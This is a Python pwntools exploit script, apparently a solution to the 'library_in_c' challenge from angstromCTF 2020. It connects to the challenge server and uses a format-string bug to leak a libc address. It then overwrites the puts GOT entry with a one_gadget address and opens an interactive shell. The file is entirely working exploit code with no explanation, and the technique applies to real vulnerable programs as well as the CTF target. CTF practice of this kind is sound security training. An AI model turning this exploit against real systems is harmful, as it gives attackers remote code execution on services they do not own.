from pwn import *

# for library_in_c challenge angstrom 2020 ctf
context.arch = 'amd64'
libc = ELF('libc.so.6')
#sh = process('./library_in_c')
sh = remote("shell.actf.co",20201)
elf = ELF('./library_in_c')

# canary leak at %25$p 
leak = '%27$p'

sh.sendlineafter("name?", leak)
sh.recvuntil('Why hello there ')
leaky = int(sh.recvline()[2:-1], 16) -240
libcaddr = leaky - libc.sym['__libc_start_main']
print("[>] Libc @: "+hex(libcaddr))

one_g = libcaddr + 0x4526a
puts_got = elf.got['puts']
payload = fmtstr_payload(16, {puts_got: one_g}, write_size='short')
print("[>] Gadget @: "+hex(one_g))
print("[>] GOT puts @: "+hex(puts_got))

sh.sendlineafter('And what book would you like to check out?', payload)
sh.interactive()
